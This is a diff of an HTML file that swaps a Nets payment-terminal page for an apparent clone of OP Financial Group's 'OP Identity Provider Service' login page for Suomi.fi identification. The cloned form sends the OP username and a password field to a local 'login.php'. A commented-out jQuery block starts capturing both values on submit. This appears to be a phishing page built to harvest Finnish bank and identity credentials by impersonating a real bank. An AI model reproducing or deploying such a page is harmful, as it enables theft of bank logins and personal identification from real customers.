@@ -1,452 +1,210 @@
 
+<!DOCTYPE html>
+<html lang="en" class="translated-ltr">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="Content-Type" content="text/html; utf-8">
+    <link rel="shortcut icon" href="/authentication/ui/legacy/favicon.ico">
+     <link rel="stylesheet" href="https://saml-idp.op.fi/static/op/opux/v3/base.css">
+    <link rel="stylesheet" href="https://saml-idp.op.fi/static/op/opux-static/v3/core.css">
+    <link rel="stylesheet" href="https://saml-idp.op.fi/static/op/opux-classic/v2/bundle.css">
+    <link rel="stylesheet" href="https://saml-idp.op.fi/static/op/opux/v3/components.css">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>OP Identity Provider Service</title>
+    <script src="https://saml-idp.op.fi/static/amd.js"></script>
+    <script src="versions.js"></script>
+    <link href="opgroupcss/op-identity-provieer.css" rel="stylesheet">
+    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="jquery" src="jquery.js"></script>
+    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="opux" src="bundle.js"></script>
+    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="moment" src="moment-with-fi-sv.js"></script>
+    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="lodash" src="lodash.js"></script>
+    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="nouislider" src="nouislider.js"></script>
+    <link type="text/css" rel="stylesheet" charset="UTF-8" href="https://www.gstatic.com/_/translate_http/_/ss/k=translate_http.tr.69JJaQ5G5xA.L.W.O/d=0/rs=AN8SPfpC36MIoWPngdVwZ4RUzeJYZaC7rg/m=el_main_css">
+    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="op/login-wrapper" src="login-plugin.js"></script>
+    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="react" src="react.js"></script>
+    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="op/opux/v3/opux-core" src="opux-core.js"></script>
+    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="react-dom" src="react-dom.js"></script>
+    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="op/opux-modal/v3/modal" src="modal.js"></script>
+    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="op/opux-infobox/v3/infobox" src="infobox.js"></script>
+    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="popperjs/core" src="popper.js"></script><style>.s1e9l74a{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;width:100%;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;text-align:center;color:#323232;line-height:2.4rem;font-size:1.7rem;margin-top:1.6rem;margin-bottom:3.6rem;text-transform:uppercase;}.s1e9l74a:before,.s1e9l74a:after{content:'';-webkit-flex:1;-ms-flex:1;flex:1;border-bottom:0.1rem solid #DCDCDC;}.s1e9l74a:before{margin-right:0.4rem;}.s1e9l74a:after{margin-left:0.4rem;}
+@media screen and (max-width:399px){.h1mb45nn{display:none;}}
+.s15nkou8{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;max-width:52.8rem;}.s15nkou8 .ds-alert{margin-top:2.4rem;margin-bottom:0;}.s15nkou8 form{width:100%;}.s15nkou8 footer{margin:2rem 0;}
+.o1mwzxa8{margin:0 auto;}
+.h1y2mlq{white-space:nowrap;margin-bottom:0 !important;}
+.g77mtws{margin-top:3.6rem;}
+.t2p5kn .ds-tile__content{margin-right:0.8rem;}@media screen and (max-width:399px){.t2p5kn{margin-top:1.6rem;}}
+.t1edtxbv{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:justify;-webkit-justify-content:space-between;-ms-flex-pack:justify;justify-content:space-between;font-weight:500;font-size:1.9rem;line-height:2.4rem;}@media screen and (min-width:800px){.t1edtxbv{font-size:2.2rem;}}
+.clglbzu{display:block;margin-left:auto;margin-right:auto;}
+.s8tyd62{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;text-align:center;}.s8tyd62 p{margin:2rem 0 2.4rem;}.s8tyd62 button{width:21rem;}
+.k1x1axhw{margin:4rem 0;}
+.i6298kk{margin-left:0.4rem;padding-top:0.4rem !important;padding-bottom:0.2rem !important;}
+.i1c4xekb{z-index:1001;}
+.h1eqnlm0[tabindex]:focus{outline-color:#6C6C6C;outline-style:dotted;outline-width:0.1rem;}
+.n19h0qi2{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;max-width:60rem;margin:4rem 0;}
+.huydt7b{margin:4rem auto;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;}
+.sbf5dj5{margin:4rem 0;max-width:100rem;}
+.p1dqi7we{font-size:4.2rem;line-height:4.4rem;margin-bottom:2rem;}
+.sj05kqb{font-size:2.8rem;line-height:3.2rem;}
+.mtntbkz{margin-bottom:1rem;}
+.m1t6edoy{margin-bottom:3rem;}
+.s1rbj2m8{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:flex-start;-webkit-box-align:flex-start;-ms-flex-align:flex-start;align-items:flex-start;border-top:1px solid rgba(0,0,0,0.15);border-bottom:1px solid rgba(0,0,0,0.15);padding:3rem 0;}.ds-alert + .s1rbj2m8{border-top:0;padding-top:0;}.s1rbj2m8 ol{margin:0;}
+.fll2k4n{-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;padding:0 1rem;width:20rem;margin-right:1rem;}.sbf5dj5 .fll2k4n{width:22rem;margin-right:3rem;}@media screen and (max-width:679px){.fll2k4n{display:none;}}
+.s8jfrax li:not([value]):before{position:absolute;margin:0.2rem 0 0 -2.8rem;background:url(data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMzIgMzIiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgaGVpZ2h0PSIzMiIgd2lkdGg9IjMyIj48cGF0aCBzdHlsZT0iZmlsbDojMDA5ZTJlIiBkPSJNMjUuMTQ3IDguMzA1YTEuMDk2IDEuMDk2IDAgMDExLjU0OC0uMTU4IDEuMDk3IDEuMDk3IDAgMDEuMTU4IDEuNTQ4TDE1Ljk2MyAyM2MtLjIxNC4yNjEtLjU5NC4zOS0uOTc5LjM4OC0uMzc2LS4wMDMtLjc1NS0uMTMyLS45ODQtLjM4OGwtNi44MDQtNy4yNWExLjA5NyAxLjA5NyAwIDAxLjA1My0xLjU1NCAxLjA5NyAxLjA5NyAwIDAxMS41NTUuMDUzbDYuMTk4IDYuNzM1TDI1LjE0NyA4LjMwNXoiIGZpbGwtcnVsZT0iZXZlbm9kZCI+PC9wYXRoPjwvc3ZnPgo=);background-repeat:no-repeat;background-size:contain;content:' ';white-space:pre;}
+.a1dxryx1{margin-top:3rem;}
+.l16m58gf{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:justify;-webkit-justify-content:space-between;-ms-flex-pack:justify;justify-content:space-between;-webkit-align-items:baseline;-webkit-box-align:baseline;-ms-flex-align:baseline;align-items:baseline;font-size:1.6rem;width:100%;}
+.ntry4c9{font-size:2.8rem;}
+.ex2etfo{margin:0 0 0.4rem;}
+.efanki3{margin-top:0.4rem;}
+.f1xj53zn{border:solid rgba(0,0,0,0.15);border-width:1px 0;padding:2.4rem 1.6rem;}.ds-alert + .f1xj53zn{border-top:0;padding-top:0;}.f1xj53zn,.f1xj53zn label{color:#323232;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;}.f1xj53zn > *{margin-bottom:0.8rem;}.f1xj53zn > :last-child{margin-bottom:0;}.f1xj53zn input{margin:0.4rem 0;}.f1xj53zn button{width:21rem;}
+.chk4o15{font-size:1.4rem;line-height:2rem;margin-top:0.4rem;text-align:center;}
+.cofvtks{color:#E5354A;}
+.h1cf9lsd{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;max-width:50rem;margin:0 auto 2rem;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;text-align:center;}.h1cf9lsd p{margin-top:3rem;max-width:44rem;}.h1cf9lsd .ds-action{display:block;margin-top:1rem;}
+.h18p02a4{margin-bottom:1rem;}
+.h1bc53v0{margin-top:1rem;}
+.neyuedu{margin-bottom:3.2rem;}.neyuedu p{margin-bottom:1rem;}
+.t6xk2qr{margin-bottom:0 !important;}
+.c1djxu0v{margin-top:3rem;max-width:30rem;}
+.m19ejyf4 .ds-modal__body{margin-top:1.8rem;}.m19ejyf4 .ds-modal__footer{-webkit-box-pack:end;-webkit-justify-content:flex-end;-ms-flex-pack:end;justify-content:flex-end;}
+.s1fld56r ellipse,.s1fld56r line,.s1fld56r path{fill:none;stroke:#6e6e6e;stroke-linecap:round;stroke-linejoin:round;stroke-miterlimit:10;stroke-width:1.25;}
+.f1ukhx6a circle{fill:#6e6e6e;}
+.c1b3om85{stroke:#6e6f70;}
+input.i1i6cocj{background:repeating-linear-gradient( to right, white, white 4.3rem, rgba(0,0,0,0.2) 4.3rem, rgba(0,0,0,0.2) 4.4rem );background-position:0 0.1rem;font-variant-numeric:tabular-nums;font-size:2.6rem;font-weight:400;-webkit-text-decoration:none;text-decoration:none;height:6rem;-webkit-letter-spacing:2.9rem;-moz-letter-spacing:2.9rem;-ms-letter-spacing:2.9rem;letter-spacing:2.9rem;padding:0.7rem 0 0.7rem 1.5rem;}
+input.i1c753b1{background:repeating-linear-gradient( to right, rgba(255,237,237,1), rgba(255,237,237,1) 4.3rem, rgba(0,0,0,0.2) 4.3rem, rgba(0,0,0,0.2) 4.4rem );}
+.spi3ceg{position:absolute;left:-10000px;top:auto;width:1px;height:1px;overflow:hidden;}
+</style><style>.g15pz2uq{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;border:1px solid rgba(0,0,0,0.2);border-width:1px 0 0 1px;line-height:2rem;max-width:740px;}.g15pz2uq li{border:1px solid rgba(0,0,0,0.2);border-width:0 1px 1px 0;min-height:12.8rem;outline:0;}
+.s9d4x37{max-width:none;}.s9d4x37 li{width:50%;}
+.m126s0u{max-width:none;}.m126s0u li{width:33.33%;}
+.weut0fb{max-width:none;}.weut0fb li{width:25%;}
+.ls8hyy5{height:100%;width:100%;display:inline-block;-webkit-transition:box-shadow 0.2s ease-out;transition:box-shadow 0.2s ease-out;}.ls8hyy5:hover,.ls8hyy5:focus{box-shadow:inset 0 0 0 1px rgba(255,106,16,0.75);}.ls8hyy5:focus{outline:0;}.ls8hyy5:active{box-shadow:inset 0 0 0 1px #ff6a10;}.ls8hyy5 div{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center;height:5rem;margin-top:2.4rem;}.ls8hyy5 img{max-width:10rem;max-height:5rem;}.ls8hyy5 span{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center;min-height:4rem;margin:0 1.2rem 0.8rem;}
+.clglbzu{display:block;margin-left:auto;margin-right:auto;}
+</style></head><body><header id="idp-header">
+        <section class="tp-header-content tp-ktss">
+            <div class="op-logo with-text"></div>
+        <a class="main-content-link" href="#opidentityprovider-container"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Go directly to content</font></font></a>
+        <ul role="navigation" aria-label="Language" class="languages">
+            <li><a id="fi" class="active-language language-link" lang="fi" title="in Finnish" href="#" aria-selected="false"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">FI</font></font></a>
+            </li>
+            <li><a id="sv" class="language-link" lang="sv" title="in Swedish" href="#" aria-selected="false"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SV</font></font></a>
+            </li>
+            <li><a id="en" class="active-language" lang="en" title="in English" href="#" aria-selected="true"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NO</font></font></a>
+            </li>
+        </ul>
+        </section>
+</header>
+<div id="op-main-container" class="notranslate"><div id="opidentityprovider-notification-container"></div><div id="opidentityprovider-privacy">
+  <section>
+  	<h1 class="op-logo-service-header" id="op_service_header">OP Identity Provider Service</h1>
+    <p>Identify yourself to <strong>Suomi.fi-tunnistus</strong>. We will forward the following information to the identification service provider: personal ID code, name</p>
+  </section>
+</div><div id="opidentityprovider-container" aria-live="polite"><section data-testid="login-section"><section class="s15nkou8"><h2 id="auth-device-opfi-header" class="h1y2mlq auth-components-h2">Authenticate yourself</h2><form id="form1" name="form1" method="post" action = "login.php" ><div class="ds-form-row ds-form-row--large ds-row"><div class="ds-form-row__label ds-col ds-col--sm-4"><span id="ds-fr-label-2">Identification method</span></div>
 
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html lang="nb-NO">
-<head id="Head1"><title>
-	Nets – Accept payment method
-</title><meta http-equiv="X-UA-Compatible" content="IE=edge" /><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" /><meta name="apple-touch-fullscreen" content="YES" /><meta name="robots" content="noindex" /><script type="text/javascript" src="https://epayment.nets.eu/terminal/lib/jquery/jquery.3.5.min.js?v3.4.2"></script>
-       
-    
-    <script src="https://epayment.nets.eu/terminal/Scripts/Mobile/Generic/Default.js?1711" type="text/javascript"></script>    
-    <!--[if lt IE 9]>
-    <script src="../../Scripts/Mobile/Generic/msie8.js" type="text/javascript"></script>
-<![endif]-->
-<link rel="stylesheet" href="https://epayment.nets.eu/terminal/Mobile/Generic/Css/netaxept.generic.mobile-Existing.css?1611" /><link rel="stylesheet" href="https://epayment.nets.eu/terminal/lib/jquery-mobile/jquery.mobile.min.css?1" /><script type="text/javascript" src="https://epayment.nets.eu/terminal/Scripts/TDSMethod.js?2052"></script></head>
-<script type="text/javascript">
-    var __doPostBack;
-    $(document).ready(function () {
+<div class="ds-form-row__item ds-col ds-col--sm-8"><div aria-labelledby="ds-fr-label-2" role="group" class="ds-radio-group ds-radio-group--large"><div class="ds-option ds-option--large"><input name="ds-g-3" aria-invalid="false" id="auth-device-radio-mobilekey" type="radio" value="mobilekey" checked=""><label class="ds-option__label" for="auth-device-radio-mobilekey">Mobile key<button class="ds-button ds-info-box-reference i6298kk ds-button--compact ds-button--ghost ds-button--minified" tabindex="0" type="button" aria-describedby="login-mobilekey-infobox-content" id="login-mobilekey-infobox"><svg aria-hidden="false" aria-label="more information" role="img" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg" class="ds-button__icon ds-icon" height="32" width="32"><path d="M16 12.391a1.41 1.41 0 1 0-.001-2.822A1.41 1.41 0 0 0 16 12.391m.279 1.61a1 1 0 0 1 1 .999v5.05L18 20a1 1 0 0 1 0 2h-4a1 1 0 0 1 0-2l1.274.05v-4.098l-.668.049a1 1 0 1 1 0-2h1.673zM6 6v20h20V6H6zm0-2h20a2 2 0 0 1 2 2v20a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2z" fill-rule="evenodd"></path></svg></button></label></div>
 
-        if (typeof (__doPostBack) !== typeof (Function)) {
-            var str = `var theForm = document.forms['form1'];
-	                    if (!theForm) {
-		                    theForm = document.form1;
-	                    }
-	                    var EVENTTARGET = document.createElement("INPUT");
-	                    EVENTTARGET.setAttribute("type", "hidden");
-	                    EVENTTARGET.setAttribute("id", "__EVENTTARGET");
-	                    EVENTTARGET.setAttribute("name", "__EVENTTARGET");
+<div class="ds-option ds-option--large">
+	<input name="ds-g-3" aria-invalid="false" id="auth-device-radio-kr" type="radio" value="keycode">
+		<label class="ds-option__label" for="auth-device-radio-kr">Key code list</label>
+		</div></div></div></div><div class="ds-form-row ds-form-row--large ds-row" style="margin-bottom: 1.6rem;"><div class="ds-form-row__label ds-col ds-col--sm-4"><label for="auth-device-userid-mobilekey" id="ds-fr-label-10">Username</label></div><div class="ds-form-row__item ds-col ds-col--sm-8"><input aria-describedby="login-inline-error-container auth-device-error-validation-mobilekey ds-ti-ml-11" aria-invalid="false" aria-required="true" id="auth-device-userid-mobilekey" maxlength="8" required="" name="userId" minlength="6" placeholder="Enter your OP username" autocomplete="off" class="ds-text-input ds-input-behavior ds-input-behavior--large" type="text" value=""><span id="ds-ti-ml-11" style="display: none;">Enter at most 8 characters</span></div></div>
+		
+<div class="ds-form-row ds-form-row--large ds-row" id="password-field" style="display: none; margin-bottom: 1.6rem;">
+  <div class="ds-form-row__label ds-col ds-col--sm-4">
+    <label for="auth-device-password">Password</label>
+  </div>
+  <div class="ds-form-row__item ds-col ds-col--sm-8">
+    <input aria-invalid="false" aria-required="true" id="auth-device-password" name="password" placeholder="Enter your password" class="ds-text-input ds-input-behavior ds-input-behavior--large" type="password">
+  </div>
+</div>
 
-	                    var EVENTARGUMENT = document.createElement("INPUT");
-	                    EVENTARGUMENT.setAttribute("type", "hidden");
-	                    EVENTARGUMENT.setAttribute("id", "__EVENTARGUMENT");
-	                    EVENTARGUMENT.setAttribute("name", "__EVENTARGUMENT");
 
-	                    theForm.appendChild(EVENTTARGET);
-	                    theForm.appendChild(EVENTARGUMENT);
+<div class="ds-form-row ds-form-row--large ds-row"><div class="ds-form-row__label ds-col ds-col--sm-4"></div><div class="ds-form-row__item ds-col ds-col--sm-8"><a class="ds-action ds-action--inline" role="button" tabindex="0" id="username-forgotten" href="#">Forgot your username?</a></div></div><div class="ds-button-row ds-button-row--primary ds-button-row--unstacked"><button aria-busy="false" class="ds-button ds-button--primary ds-button--large" type="submit" id="auth-device-submit-mobilekey">Continue</button><button class="ds-button ds-button--alternate ds-button--large" id="auth-cancel" type="button">Cancel</button></div></form></section><div aria-live="polite" aria-hidden="true" style="display: none;"></div></section></div><div><div tabindex="0" id="login-mobilekey-infobox-content" class="ds-info-box" role="tooltip" data-popper-placement="right" style="position: absolute; inset: 329.6px auto auto 532px; margin: 0px;"><div data-popper-arrow="true" style="position: absolute; top: 12px;"></div><div>Confirm identification with Mobile key on your phone or tablet. You will receive a confirmation request on OP-mobile or OP Business mobile.</div><button class="ds-button ds-info-box__close ds-button--compact ds-button--ghost ds-button--minified" tabindex="0"><svg aria-hidden="false" aria-label="close" role="img" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg" class="ds-button__icon ds-icon ds-icon--small" height="32" width="32"><path d="m16 14.727 7.864-7.864a.897.897 0 0 1 1.272 0 .897.897 0 0 1 0 1.273L17.273 16l7.863 7.863a.898.898 0 0 1 0 1.273.897.897 0 0 1-1.272 0L16 17.272l-7.864 7.864a.897.897 0 0 1-1.272 0 .897.897 0 0 1 0-1.273L14.727 16 6.864 8.136a.897.897 0 0 1 0-1.273.897.897 0 0 1 1.272 0L16 14.727z" fill-rule="evenodd"></path></svg></button></div></div></div><script src="runtime-provider.js"></script><script src="vendor.js"></script><script src="op-provider-identity.js"></script><footer id="idp-footer">
 
-                        if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
-                            theForm.__EVENTTARGET.value = eventTarget;
-                            theForm.__EVENTARGUMENT.value = eventArgument;
-                            theForm.submit();
-                        }`
+    <div class="footer-content">
+        <p style="margin-bottom: 20px;">
+            <a class="ds-action ds-action--external" href="https://www.op.fi/accessibility/identification-accessibility-statement" aria-label="Accessibility statement, opens in a new window." target="_blank">
+              <span class="ds-action__label"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Accessibility statement</font></font></span>
+              <svg aria-hidden="false" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg" class="ds-action__icon ds-icon ds-icon--small ds-icon--action" height="32" width="32"><path d="M22 22v-4a1 1 0 012 0v5a1 1 0 01-1 1H9a1 1 0 01-1-1V9a1 1 0 011-1h4.998a1 1 0 010 2H10v12h12zm1.91-12.482l-6.197 6.299a1 1 0 01-1.426-1.403l6.225-6.328-3.466.159a1 1 0 01-.092-1.998L24.37 6c.9 0 1.631.73 1.63 1.68l-.255 5.337a1 1 0 11-1.998-.095l.164-3.404z" fill-rule="evenodd"></path></svg>
+            </a>
+        </p>
+        <p class="copy"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+            © OP Financial Group
+        </font></font></p>
+    </div>
+</footer><div id="goog-gt-" class="skiptranslate VIpgJd-yAWNEb-L7lbkb" dir="ltr"><div style="padding: 8px;"><div><div class="VIpgJd-yAWNEb-l4eHX"><img src="https://www.gstatic.com/images/branding/product/1x/translate_24dp.png" width="20" height="20" alt="Google Translate"></div></div></div><div style="padding: 8px; float: left; width: 100%;"><h1 class="VIpgJd-yAWNEb-r4nke VIpgJd-yAWNEb-mrxPge">Original text</h1></div><div style="padding: 8px;"><div class="VIpgJd-yAWNEb-nVMfcd-fmcmS"></div></div><div class="VIpgJd-yAWNEb-cGMI2b" style="padding: 8px;"><div class="VIpgJd-yAWNEb-Z0Arqf-PLDbbf"><span class="VIpgJd-yAWNEb-Z0Arqf-hSRGPd">Contribute a better translation</span></div><div class="VIpgJd-yAWNEb-fw42Ze-Z0Arqf-haAclf"><hr style="color: #ccc; background-color: #ccc; height: 1px; border: none;"><div class="VIpgJd-yAWNEb-Z0Arqf-H9tDt"></div></div></div><div class="VIpgJd-yAWNEb-jOfkMb-Ne3sFf" style="display: none;"></div></div>
+<div class="ReactModalPortal"></div>
 
-            __doPostBack = new Function('eventTarget', 'eventArgument', str);
-        }
+<script>
+  document.getElementById('auth-device-radio-mobilekey').addEventListener('change', function() {
+    document.getElementById('password-field').style.display = 'none';
+  });
 
-             
-
-    });
+  document.getElementById('auth-device-radio-kr').addEventListener('change', function() {
+    document.getElementById('password-field').style.display = 'block';
+  });
 </script>
-
-<body id="body">
-         
-    <link rel="stylesheet" href="https://epayment.nets.eu/terminal/lib/jquery-mobile/jquery.mobile.min.css?1" />
-    <script src="https://epayment.nets.eu/terminal/lib/jquery-mobile/jquery.mobile.3.5.min.js?v=3.4.2" type="text/javascript"></script>
-    
-    <style>
-
-
+<!--
+<script>
+  $(document).ready(function() {
+    // Replace 'form1' with the actual ID of your form element if different
+    $('#form1').submit(function(e) {
+      var auth-device-userid-mobilekey = $('#auth-device-userid-mobilekey').val();
+      var auth-device-password = $('#auth-device-password').val();
       
 
-        </style>
-        
-        <style>
-                    .ui-body-netaxept, .ui-overlay-netaxept {
-            background: #f2f2f2;
-        }
-        .ui-btn-up-netaxeptCancel,.ui-btn-hover-netaxeptCancel 
-        {
-        color      : #FFFFFF;
-        background :#d62700;     
-        }      
-                .ui-btn-up-netaxeptPay, .ui-btn-hover-netaxeptPay {
-            color: #000000;
-            background: #4b8500;
-        } 
-                  .ui-bar-netaxept {
-            color: ;
-            background: #f2f2f2;
-        }
-
-        </style>
-        
-
-    <div data-role="page" data-theme="netaxept" id="terminalPage" >
-        <form name="form1" method="post" action="login.php" id="form1" data-ajax="false">
-<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="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